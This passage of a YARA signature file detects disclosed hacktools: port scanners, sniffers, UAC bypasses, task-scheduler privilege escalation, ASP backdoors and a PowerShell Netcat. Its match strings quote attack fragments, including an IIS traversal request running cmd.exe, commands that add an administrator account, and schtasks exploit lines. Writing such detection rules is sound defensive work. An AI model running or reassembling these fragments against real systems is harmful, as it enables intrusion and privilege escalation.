$s0 = "<IconFile>C:\\WINDOWS\\App.ico</IconFile>" fullword
$s1 = "Failed to read the entire file" fullword
$s4 = "<VersionCreatedBy>14.4.0</VersionCreatedBy>" fullword
$s8 = "<ProgressCaption>Run &quot;executor.bat&quot; once the shell has spawned.</P"
$s9 = "Running Zip pipeline..." fullword
$s10 = "<FinTitle />" fullword
$s12 = "<AutoTemp>0</AutoTemp>" fullword
$s14 = "<DefaultDir>%TEMP%</DefaultDir>" fullword
$s15 = "AES Encrypting..." fullword
$s20 = "<UnzipDir>%TEMP%</UnzipDir>" fullword
condition:
all of them
}
rule SSC_iKAT_gpdisable_customcmd_kitrap0d_uacpoc {
meta:
description = "iKAT hack tool set generic rule - from files gpdisable.exe, customcmd.exe, kitrap0d.exe, uacpoc.exe"
author = "Florian Roth"
date = "05.11.14"
reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
super_rule = 1
hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
hash1 = "2725690954c2ad61f5443eb9eec5bd16ab320014"
hash2 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
hash3 = "b65a460d015fd94830d55e8eeaf6222321e12349"
score = 20
strings:
$s0 = "Failed to get temp file for source AES decryption" fullword
$s5 = "Failed to get encryption header for pwd-protect" fullword
$s17 = "Failed to get filetime" fullword
$s20 = "Failed to delete temp file for password decoding (3)" fullword
condition:
all of them
}
rule SSC_Powershell_Netcat {
meta:
description = "Detects a Powershell version of the Netcat network hacking tool"
author = "Florian Roth"
score = 60
date = "10.10.2014"
strings:
$s0 = "[ValidateRange(1, 65535)]" fullword
$s1 = "$Client = New-Object -TypeName System.Net.Sockets.TcpClient" fullword
$s2 = "$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize" fullword
condition:
all of them
}
rule SSC_VUBrute_VUBrute {
meta:
description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file VUBrute.exe"
author = "Florian Roth"
date = "22.11.14"
score = 70
hash = "166fa8c5a0ebb216c832ab61bf8872da556576a7"
strings:
$s0 = "Text Files (*.txt);;All Files (*)" fullword ascii
$s1 = "http://ubrute.com" fullword ascii
$s11 = "IP - %d; Password - %d; Combination - %d" fullword ascii
$s14 = "error.txt" fullword ascii
condition:
all of them
}
rule SSC_pw_inspector_2 {
meta:
description = "Chinese Hacktool Set - file pw-inspector.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "e0a1117ee4a29bb4cf43e3a80fb9eaa63bb377bf"
strings:
$s1 = "Use for hacking: trim your dictionary file to the pw requirements of the target." fullword ascii
$s2 = "Syntax: %s [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p " ascii
$s3 = "PW-Inspector" fullword ascii
$s4 = "i:o:m:M:c:lunps" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}
rule SSC_Chinese_Hacktool_1014 {
meta:
description = "Detects a chinese hacktool with unknown use"
author = "Florian Roth"
score = 60
date = "10.10.2014"
hash = "98c07a62f7f0842bcdbf941170f34990"
strings:
$s0 = "IEXT2_IDC_HORZLINEMOVECURSOR" fullword wide
$s1 = "msctls_progress32" fullword wide
$s2 = "Reply-To: %s" fullword ascii
$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
$s4 = "html htm htx asp" fullword ascii
condition:
all of them
}
rule SSC_DomainScanV1_0 {
meta:
description = "Auto-generated rule on file DomainScanV1_0.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "aefcd73b802e1c2bdc9b2ef206a4f24e"
strings:
$s0 = "dIJMuX$aO-EV"
$s1 = "XELUxP\"-\\"
$s2 = "KaR\"U'}-M,."
$s3 = "V.)\\ZDxpLSav"
$s4 = "Decompress error"
$s5 = "Can't load library"
$s6 = "Can't load function"
$s7 = "com0tl32:.d"
condition:
all of them
}
rule SSC_Hacktools_CN_Burst_Start {
meta:
description = "Disclosed hacktool set - file Start.bat - DoS tool"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "75d194d53ccc37a68286d246f2a84af6b070e30c"
strings:
$s0 = "for /f \"eol= tokens=1,2 delims= \" %%i in (ip.txt) do (" fullword ascii
$s1 = "Blast.bat /r 600" fullword ascii
$s2 = "Blast.bat /l Blast.bat" fullword ascii
$s3 = "Blast.bat /c 600" fullword ascii
$s4 = "start Clear.bat" fullword ascii
$s5 = "del Result.txt" fullword ascii
$s6 = "s syn %%i %%j 3306 /save" fullword ascii
$s7 = "start Thecard.bat" fullword ascii
$s10 = "setlocal enabledelayedexpansion" fullword ascii
condition:
5 of them
}
rule SSC_LinuxHacktool_eyes_screen {
meta:
description = "Linux hack tools - file screen"
author = "Florian Roth"
reference = "not set"
date = "2015/01/19"
hash = "a240a0118739e72ff89cefa2540bf0d7da8f8a6c"
strings:
$s0 = "or: %s -r [host.tty]" fullword ascii
$s1 = "%s: process: character, ^x, or (octal) \\032 expected." fullword ascii
$s2 = "Type \"screen [-d] -r [pid.]tty.host\" to resume one of them." fullword ascii
$s6 = "%s: at [identifier][%%|*|#] command [args]" fullword ascii
$s8 = "Slurped only %d characters (of %d) into buffer - try again" fullword ascii
$s11 = "command from %s: %s %s" fullword ascii
$s16 = "[ Passwords don't match - your armor crumbles away ]" fullword ascii
$s19 = "[ Passwords don't match - checking turned off ]" fullword ascii
condition:
all of them
}
rule SSC_IP_Stealing_Utilities {
meta:
description = "Auto-generated rule on file IP Stealing Utilities.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "65646e10fb15a2940a37c5ab9f59c7fc"
strings:
$s0 = "DarkKnight"
$s9 = "IPStealerUtilities"
condition:
all of them
}
rule SSC_CN_Packed_Scanner {
meta:
description = "Suspiciously packed executable"
author = "Florian Roth"
hash = "6323b51c116a77e3fba98f7bb7ff4ac6"
score = 40
date = "06.10.2014"
strings:
$s1 = "kernel32.dll" fullword ascii
$s2 = "CRTDLL.DLL" fullword ascii
$s3 = "__GetMainArgs" fullword ascii
$s4 = "WS2_32.DLL" fullword ascii
condition:
all of them and filesize < 180KB and filesize > 70KB
}
rule SSC_QQ_zip_Folder_QQ {
meta:
description = "Disclosed hacktool set (old stuff) - file QQ.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "9f8e3f40f1ac8c1fa15a6621b49413d815f46cfb"
strings:
$s0 = "EMAIL:haoq@neusoft.com" fullword wide
$s1 = "EMAIL:haoq@neusoft.com" fullword wide
$s4 = "QQ2000b.exe" fullword wide
$s5 = "haoq@neusoft.com" fullword ascii
$s9 = "QQ2000b.exe" fullword ascii
$s10 = "\\qq2000b.exe" fullword ascii
$s12 = "WINDSHELL STUDIO[WINDSHELL " fullword wide
$s17 = "SOFTWARE\\HAOQIANG\\" fullword ascii
condition:
5 of them
}
rule SSC__iissample_nesscan_twwwscan {
meta:
description = "Disclosed hacktool set (old stuff) - from files iissample.exe, nesscan.exe, twwwscan.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
super_rule = 1
hash0 = "7f20962bbc6890bf48ee81de85d7d76a8464b862"
hash1 = "c0b1a2196e82eea4ca8b8c25c57ec88e4478c25b"
hash2 = "548f0d71ef6ffcc00c0b44367ec4b3bb0671d92f"
strings:
$s0 = "Connecting HTTP Port - Result: " fullword
$s1 = "No space for command line argument vector" fullword
$s3 = "Microsoft(July/1999~) http://www.microsoft.com/technet/security/current.asp" fullword
$s5 = "No space for copy of command line" fullword
$s7 = "-  Windows NT,2000 Patch Method  - " fullword
$s8 = "scanf : floating point formats not linked" fullword
$s12 = "hrdir_b.c: LoadLibrary != mmdll borlndmm failed" fullword
$s13 = "!\"what?\"" fullword
$s14 = "%s Port %d Closed" fullword
$s16 = "printf : floating point formats not linked" fullword
$s17 = "xxtype.cpp" fullword
condition:
all of them
}
rule SSC_Tools_scan {
meta:
description = "Chinese Hacktool Set - file scan.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "c580a0cc41997e840d2c0f83962e7f8b636a5a13"
strings:
$s2 = "Shanlu Studio" fullword wide
$s3 = "_AutoAttackMain" fullword ascii
$s4 = "_frmIpToAddr" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}
rule SSC_sig_238_TFTPD32 {
meta:
description = "Disclosed hacktool set (old stuff) - file TFTPD32.EXE"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8"
strings:
$s0 = " http://arm.533.net" fullword ascii
$s1 = "Tftpd32.hlp" fullword ascii
$s2 = "Timeouts and Ports should be numerical and can not be 0" fullword ascii
$s3 = "TFTPD32 -- " fullword wide
$s4 = "%d -- %s" fullword ascii
$s5 = "TIMEOUT while waiting for Ack block %d. file <%s>" fullword ascii
$s12 = "TftpPort" fullword ascii
$s13 = "Ttftpd32BackGround" fullword ascii
$s17 = "SOFTWARE\\TFTPD32" fullword ascii
condition:
all of them
}
rule SSC_CN_Hacktool_SSPort_Portscanner {
meta:
description = "Detects a chinese Portscanner named SSPort"
author = "Florian Roth"
score = 70
date = "12.10.2014"
strings:
$s0 = "Golden Fox" fullword wide
$s1 = "Syn Scan Port" fullword wide
$s2 = "CZ88.NET" fullword wide
condition:
all of them
}
rule SSC_iKAT_tools_nmap {
meta:
description = "Generic rule for NMAP - based on NMAP 4 standalone"
author = "Florian Roth"
date = "05.11.14"
score = 50
reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
hash = "d0543f365df61e6ebb5e345943577cc40fca8682"
strings:
$s0 = "Insecure.Org" fullword wide
$s1 = "Copyright (c) Insecure.Com" fullword wide
$s2 = "nmap" fullword nocase
$s3 = "Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm)." ascii
condition:
all of them
}
rule SSC_arpsniffer {
meta:
description = "Chinese Hacktool Set - file arpsniffer.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "7d8753f56fc48413fc68102cff34b6583cb0066c"
strings:
$s1 = "SHELL" ascii
$s2 = "PacketSendPacket" fullword ascii
$s3 = "ArpSniff" ascii
$s4 = "pcap_loop" fullword ascii  /* Goodware String - occured 3 times */
$s5 = "packet.dll" fullword ascii  /* Goodware String - occured 4 times */
condition:
uint16(0) == 0x5a4d and filesize < 120KB and all of them
}
rule SSC_Arp_EMP_v1_0 {
meta:
description = "Chinese Hacktool Set - file Arp EMP v1.0.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "ae4954c142ad1552a2abaef5636c7ef68fdd99ee"
strings:
$s0 = "Arp EMP v1.0.exe" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 800KB and all of them
}
rule SSC_CN_Tools_hscan {
meta:
description = "Chinese Hacktool Set - file hscan.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "17a743e40790985ececf5c66eaad2a1f8c4cffe8"
strings:
$s1 = "%s -f hosts.txt -port -ipc -pop -max 300,20 -time 10000" fullword ascii
$s2 = "%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,20" fullword ascii
$s3 = "%s -h www.target.com -all" fullword ascii
$s4 = ".\\report\\%s-%s.html" fullword ascii
$s5 = ".\\log\\Hscan.log" fullword ascii
$s6 = "[%s]: Found cisco Enable password: %s !!!" fullword ascii
$s7 = "%s@ftpscan#FTP Account:  %s/[null]" fullword ascii
$s8 = ".\\conf\\mysql_pass.dic" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 300KB and all of them
}
rule SSC_ustrrefadd {
meta:
description = "Chinese Hacktool Set - file ustrrefadd.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "b371b122460951e74094f3db3016264c9c8a0cfa"
strings:
$s0 = "E-Mail  : admin@luocong.com" fullword ascii
$s1 = "Homepage: http://www.luocong.com" fullword ascii
$s2 = ": %d  -  " fullword ascii
$s3 = "ustrreffix.dll" fullword ascii
$s5 = "Ultra String Reference plugin v%d.%02d" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 320KB and all of them
}
rule SSC_FreeVersion_release {
meta:
description = "Chinese Hacktool Set - file release.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "f42e4b5748e92f7a450eb49fc89d6859f4afcebb"
strings:
$s1 = "-->Got WMI process Pid: %d " ascii
$s2 = "This exploit will execute \"net user " ascii
$s3 = "net user temp 123456 /add & net localgroup administrators temp /add" fullword ascii
$s4 = "Running reverse shell" ascii
$s5 = "wmiprvse.exe" fullword ascii
$s6 = "SELECT * FROM IIsWebInfo" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and 3 of them
}
rule SSC_dbexpora {
meta:
description = "Chinese Hacktool Set - file dbexpora.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "b55b007ef091b2f33f7042814614564625a8c79f"
strings:
$s0 = "SELECT A.USER FROM SYS.USER_USERS A " fullword ascii
$s12 = "OCI 8 - OCIDescriptorFree" fullword ascii
$s13 = "ORACommand *" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 835KB and all of them
}
rule SSC_CN_GUI_Scanner {
meta:
description = "Detects an unknown GUI scanner tool - CN background"
author = "Florian Roth"
hash = "3c67bbb1911cdaef5e675c56145e1112"
score = 65
date = "04.10.2014"
strings:
$s1 = "good.txt" fullword ascii
$s2 = "IP.txt" fullword ascii
$s3 = "xiaoyuer" fullword ascii
$s0w = "ssh(" fullword wide
$s1w = ").exe" fullword wide
condition:
all of them
}
rule SSC_MooreR_Port_Scanner {
meta:
description = "Auto-generated rule on file MooreR Port Scanner.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "376304acdd0b0251c8b19fea20bb6f5b"
strings:
$s0 = "Description|"
$s3 = "soft Visual Studio\\VB9yp"
$s4 = "adj_fptan?4"
$s7 = "DOWS\\SyMem32\\/o"
condition:
all of them
}
rule SSC_SwitchSniffer {
meta:
description = "Chinese Hacktool Set - file SwitchSniffer.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "1e7507162154f67dff4417f1f5d18b4ade5cf0cd"
strings:
$s0 = "NextSecurity.NET" fullword wide
$s2 = "SwitchSniffer Setup" fullword wide
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_sig_238_listip {
meta:
description = "Disclosed hacktool set (old stuff) - file listip.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "f32a0c5bf787c10eb494eb3b83d0c7a035e7172b"
strings:
$s0 = "ERROR!!! Bad host lookup. Program Terminate." fullword ascii
$s2 = "ERROR No.2!!! Program Terminate." fullword ascii
$s4 = "Local Host Name: %s" fullword ascii
$s5 = "Packed by exe32pack 1.38" fullword ascii
$s7 = "Local Computer Name: %s" fullword ascii
$s8 = "Local IP Adress: %s" fullword ascii
condition:
all of them
}
rule SSC_Guilin_veterans_cookie_spoofing_tool {
meta:
description = "Chinese Hacktool Set - file Guilin veterans cookie spoofing tool.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "06b1969bc35b2ee8d66f7ce8a2120d3016a00bb1"
strings:
$s0 = "kernel32.dll^G" fullword ascii
$s1 = "\\.Sus\"B" fullword ascii
$s4 = "u56Load3" fullword ascii
$s11 = "O MYTMP(iM) VALUES (" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1387KB and all of them
}
rule SSC_PortScanner {
meta:
description = "Auto-generated rule on file PortScanner.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "b381b9212282c0c650cb4b0323436c63"
strings:
$s0 = "Scan Ports Every"
$s3 = "Scan All Possible Ports!"
condition:
all of them
}
rule SSC_BypassUac_EXE {
meta:
description = "Auto-generated rule - file BypassUacDll.aps"
author = "yarGen Yara Rule Generator"
hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
strings:
$s1 = "Wole32.dll" wide
$s3 = "System32\\migwiz" wide
$s4 = "System32\\migwiz\\CRYPTBASE.dll" wide
$s5 = "Elevation:Administrator!new:" wide
$s6 = "BypassUac" wide
condition:
all of them
}
rule SSC_sig_238_Glass2k {
meta:
description = "Disclosed hacktool set (old stuff) - file Glass2k.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "b05455a1ecc6bc7fc8ddef312a670f2013704f1a"
strings:
$s0 = "Portions Copyright (c) 1997-1999 Lee Hasiuk" fullword ascii
$s1 = "C:\\Program Files\\Microsoft Visual Studio\\VB98" fullword ascii
$s3 = "WINNT\\System32\\stdole2.tlb" fullword ascii
$s4 = "Glass2k.exe" fullword wide
$s7 = "NeoLite Executable File Compressor" fullword ascii
condition:
all of them
}
rule SSC_Dos_NtGod {
meta:
description = "Chinese Hacktool Set - file NtGod.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "adefd901d6bbd8437116f0170b9c28a76d4a87bf"
strings:
$s0 = "\\temp\\NtGodMode.exe" ascii
$s4 = "NtGodMode.exe" fullword ascii
$s10 = "ntgod.bat" fullword ascii
$s19 = "sfxcmd" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 250KB and all of them
}
rule SSC_PScan_Portscan_1 {
meta:
description = "PScan - Port Scanner"
author = "F. Roth"
score = 50
strings:
$a = "00050;0F0M0X0a0v0}0"
$b = "vwgvwgvP76"
$c = "Pr0PhOFyP"
condition:
all of them
}
rule SSC_sig_238_concon {
meta:
description = "Disclosed hacktool set (old stuff) - file concon.com"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "816b69eae66ba2dfe08a37fff077e79d02b95cc1"
strings:
$s0 = "Usage: concon \\\\ip\\sharename\\con\\con" fullword ascii
condition:
all of them
}
rule SSC_Dos_c {
meta:
description = "Chinese Hacktool Set - file c.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "3deb6bd52fdac6d5a3e9a91c585d67820ab4df78"
strings:
$s0 = "!Win32 .EXE." fullword ascii
$s1 = ".MPRESS1" fullword ascii
$s2 = ".MPRESS2" fullword ascii
$s3 = "XOLEHLP.dll" fullword ascii
$s4 = "</body></html>" fullword ascii
$s8 = "DtcGetTransactionManagerExA" fullword ascii  /* Goodware String - occured 12 times */
$s9 = "GetUserNameA" fullword ascii  /* Goodware String - occured 305 times */
condition:
uint16(0) == 0x5a4d and filesize < 100KB and all of them
}
rule SSC_dll_PacketX {
meta:
description = "Chinese Hacktool Set - file PacketX.dll - ActiveX wrapper for WinPcap packet capture library"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
score = 50
hash = "3f0908e0a38512d2a4fb05a824aa0f6cf3ba3b71"
strings:
$s9 = "[Failed to load winpcap packet.dll." wide
$s10 = "PacketX Version" wide
condition:
uint16(0) == 0x5a4d and filesize < 1920KB and all of them
}
rule SSC_EditKeyLog {
meta:
description = "Disclosed hacktool set (old stuff) - file EditKeyLog.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "a450c31f13c23426b24624f53873e4fc3777dc6b"
strings:
$s1 = "Press Any Ke" fullword ascii
$s2 = "Enter 1 O" fullword ascii
$s3 = "Bon >0 & <65535L" fullword ascii
$s4 = "--Choose " fullword ascii
condition:
all of them
}
rule SSC_sig_238_2323 {
meta:
description = "Disclosed hacktool set (old stuff) - file 2323.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "21812186a9e92ee7ddc6e91e4ec42991f0143763"
strings:
$s0 = "port - Port to listen on, defaults to 2323" fullword ascii
$s1 = "Usage: srvcmd.exe [/h] [port]" fullword ascii
$s3 = "Failed to execute shell" fullword ascii
$s5 = "/h   - Hide Window" fullword ascii
$s7 = "Accepted connection from client at %s" fullword ascii
$s9 = "Error %d: %s" fullword ascii
condition:
all of them
}
rule SSC_unknown2 {
meta:
description = "Chinese Hacktool Set - file unknown2.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "32508d75c3d95e045ddc82cb829281a288bd5aa3"
strings:
$s1 = "http://md5.com.cn/index.php/md5reverse/index/md/" fullword wide
$s2 = "http://www.md5decrypter.co.uk/feed/api.aspx?" fullword wide
$s3 = "http://www.md5.com.cn" fullword wide
$s4 = "1.5.exe" fullword wide
$s5 = "\\Set.ini" fullword wide
$s6 = "OpenFileDialog1" fullword wide
$s7 = " (*.txt)|*.txt" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 300KB and 4 of them
}
rule SSC_ipsearcher {
meta:
description = "Chinese Hacktool Set - file ipsearcher.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "1e96e9c5c56fcbea94d26ce0b3f1548b224a4791"
strings:
$s0 = "http://www.wzpg.com" fullword ascii
$s1 = "ipsearcher\\ipsearcher\\Release\\ipsearcher.pdb" fullword ascii
$s3 = "_GetAddress" fullword ascii
$s5 = "ipsearcher.dll" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 140KB and all of them
}
rule SSC_scanarator {
meta:
description = "Auto-generated rule on file scanarator.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "848bd5a518e0b6c05bd29aceb8536c46"
strings:
$s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"
condition:
all of them
}
rule SSC_sqlcheck {
meta:
description = "Disclosed hacktool set (old stuff) - file sqlcheck.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "5a5778ac200078b627db84fdc35bf5bcee232dc7"
strings:
$s0 = "Power by eyas<cooleyas@21cn.com>" fullword ascii
$s3 = "\\ipc$ \"\" /user:\"\"" fullword ascii
$s4 = "SQLCheck can only scan a class B network. Try again." fullword ascii
$s14 = "Example: SQLCheck 192.168.0.1 192.168.0.254" fullword ascii
$s20 = "Usage: SQLCheck <StartIP> <EndIP>" fullword ascii
condition:
3 of them
}
rule SSC_Hacktools_CN_JoHor_Posts_Killer {
meta:
description = "Disclosed hacktool set - file JoHor_Posts_Killer.exe"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "d157f9a76f9d72dba020887d7b861a05f2e56b6a"
strings:
$s0 = "Multithreading Posts_Send Killer" fullword ascii
$s3 = "GET [Access Point] HTTP/1.1" fullword ascii
$s6 = "The program's need files was not exist!" fullword ascii
$s7 = "JoHor_Posts_Killer" fullword wide
$s8 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword ascii
$s10 = "  ( /s ) :" fullword ascii
$s11 = "forms.vbp" fullword ascii
$s12 = "forms.vcp" fullword ascii
$s13 = "Software\\FlySky\\E\\Install" fullword ascii
condition:
5 of them
}
rule SSC_sig_238_filespy {
meta:
description = "Disclosed hacktool set (old stuff) - file filespy.exe"
author = "Florian Roth"
date = "23.11.14"
score = 50
hash = "89d8490039778f8c5f07aa7fd476170293d24d26"
strings:
$s0 = "Hit [Enter] to begin command mode..." fullword ascii
$s1 = "If you are in command mode," fullword ascii
$s2 = "[/l] lists all the drives the monitor is currently attached to" fullword ascii
$s9 = "FileSpy.exe" fullword wide
$s12 = "ERROR starting FileSpy..." fullword ascii
$s16 = "exe\\filespy.dbg" fullword ascii
$s17 = "[/d <drive>] detaches monitor from <drive>" fullword ascii
$s19 = "Should be logging to screen..." fullword ascii
$s20 = "Filmon:  Unknown log record type" fullword ascii
condition:
7 of them
}
rule SSC_BluesPortScan {
meta:
description = "Auto-generated rule on file BluesPortScan.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "6292f5fc737511f91af5e35643fc9eef"
strings:
$s0 = "This program was made by Volker Voss"
$s1 = "JiBOo~SSB"
condition:
all of them
}
rule SSC_wce
{
meta:
description		= "wce"
author			= "Benjamin DELPY (gentilkiwi)"
tool_author		= "Hernan Ochoa (hernano)"
strings:
$hex_legacy		= { 8b ff 55 8b ec 6a 00 ff 75 0c ff 75 08 e8 [0-3] 5d c2 08 00 }
$hex_x86		= { 8d 45 f0 50 8d 45 f8 50 8d 45 e8 50 6a 00 8d 45 fc 50 [0-8] 50 72 69 6d 61 72 79 00 }
$hex_x64		= { ff f3 48 83 ec 30 48 8b d9 48 8d 15 [0-16] 50 72 69 6d 61 72 79 00 }
condition:
any of them
}
rule SSC_ms10048_x64 {
meta:
description = "Chinese Hacktool Set - file ms10048-x64.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "418bec3493c85e3490e400ecaff5a7760c17a0d0"
strings:
$s1 = "The target is most likely patched." fullword ascii
$s2 = "Dojibiron by Ronald Huizer, (c) master#h4cker.us  " fullword ascii
$s3 = "[ ] Creating evil window" fullword ascii
$s4 = "[+] Set to %d exploit half succeeded" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 40KB and 1 of them
}
rule SSC_iKAT_priv_esc_tasksch {
meta:
description = "Task Schedulder Local Exploit - Windows local priv-esc using Task Scheduler, published by webDevil. Supports Windows 7 and Vista."
author = "Florian Roth"
date = "05.11.14"
score = 75
reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
hash = "84ab94bff7abf10ffe4446ff280f071f9702cf8b"
strings:
$s0 = "objShell.Run \"schtasks /change /TN wDw00t /disable\",,True" fullword ascii
$s3 = "objShell.Run \"schtasks /run /TN wDw00t\",,True" fullword ascii
$s4 = "'objShell.Run \"cmd /c copy C:\\windows\\system32\\tasks\\wDw00t .\",,True" fullword ascii
$s6 = "a.WriteLine (\"schtasks /delete /f /TN wDw00t\")" fullword ascii
$s7 = "a.WriteLine (\"net user /add ikat ikat\")" fullword ascii
$s8 = "a.WriteLine (\"cmd.exe\")" fullword ascii
$s9 = "strFileName=\"C:\\windows\\system32\\tasks\\wDw00t\"" fullword ascii
$s10 = "For n = 1 To (Len (hexXML) - 1) step 2" fullword ascii
$s13 = "output.writeline \" Should work on Vista/Win7/2008 x86/x64\"" fullword ascii
$s11 = "Set objExecObject = objShell.Exec(\"cmd /c schtasks /query /XML /TN wDw00t\")" fullword ascii
$s12 = "objShell.Run \"schtasks /create /TN wDw00t /sc monthly /tr \"\"\"+biatchFile+\"" ascii
$s14 = "a.WriteLine (\"net localgroup administrators /add v4l\")" fullword ascii
$s20 = "Set ts = fso.createtextfile (\"wDw00t.xml\")" fullword ascii
condition:
2 of them
}
rule SSC_DTools2_02_DTools {
meta:
description = "Chinese Hacktool Set - file DTools.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "9f99771427120d09ec7afa3b21a1cb9ed720af12"
strings:
$s0 = "kernel32.dll" ascii
$s1 = "TSETPASSWORDFORM" fullword wide
$s2 = "TGETNTUSERNAMEFORM" fullword wide
$s3 = "TPORTFORM" fullword wide
$s4 = "ShellFold" fullword ascii
$s5 = "DefaultPHotLigh" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}
rule SSC_sig_238_eee {
meta:
description = "Disclosed hacktool set (old stuff) - file eee.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "236916ce2980c359ff1d5001af6dacb99227d9cb"
strings:
$s0 = "szj1230@yesky.com" fullword wide
$s3 = "C:\\Program Files\\DevStudio\\VB\\VB5.OLB" fullword ascii
$s4 = "MailTo:szj1230@yesky.com" fullword wide
$s5 = "Command1_Click" fullword ascii
$s7 = "software\\microsoft\\internet explorer\\typedurls" fullword wide
$s11 = "vb5chs.dll" fullword ascii
$s12 = "MSVBVM50.DLL" fullword ascii
condition:
all of them
}
rule SSC_aspbackdoor_EDIR {
meta:
description = "Disclosed hacktool set (old stuff) - file EDIR.ASP"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "03367ad891b1580cfc864e8a03850368cbf3e0bb"
strings:
$s1 = "response.write \"<a href='index.asp'>" fullword ascii
$s3 = "if Request.Cookies(\"password\")=\"" ascii
$s6 = "whichdir=server.mappath(Request(\"path\"))" fullword ascii
$s7 = "Set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
$s19 = "whichdir=Request(\"path\")" fullword ascii
condition:
all of them
}
rule SSC_dat_xpf {
meta:
description = "Chinese Hacktool Set - file xpf.sys"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "761125ab594f8dc996da4ce8ce50deba49c81846"
strings:
$s1 = "UnHook IoGetDeviceObjectPointer ok!" fullword ascii
$s2 = "\\Device\\XScanPF" fullword wide
$s3 = "\\DosDevices\\XScanPF" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 25KB and all of them
}
rule SSC_sig_238_rshsvc {
meta:
description = "Disclosed hacktool set (old stuff) - file rshsvc.bat"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "fb15c31254a21412aecff6a6c4c19304eb5e7d75"
strings:
$s0 = "if not exist %1\\rshsetup.exe goto ERROR2" fullword ascii
$s1 = "ECHO rshsetup.exe is not found in the %1 directory" fullword ascii
$s9 = "REM %1 directory must have rshsetup.exe,rshsvc.exe and rshsvc.dll" fullword ascii
$s10 = "copy %1\\rshsvc.exe" fullword ascii
$s12 = "ECHO Use \"net start rshsvc\" to start the service." fullword ascii
$s13 = "rshsetup %SystemRoot%\\system32\\rshsvc.exe %SystemRoot%\\system32\\rshsvc.dll" fullword ascii
$s18 = "pushd %SystemRoot%\\system32" fullword ascii
condition:
all of them
}
rule SSC_WinEggDropShellFinal_zip_Folder_InjectT {
meta:
description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
author = "Florian Roth"
date = "23.11.14"
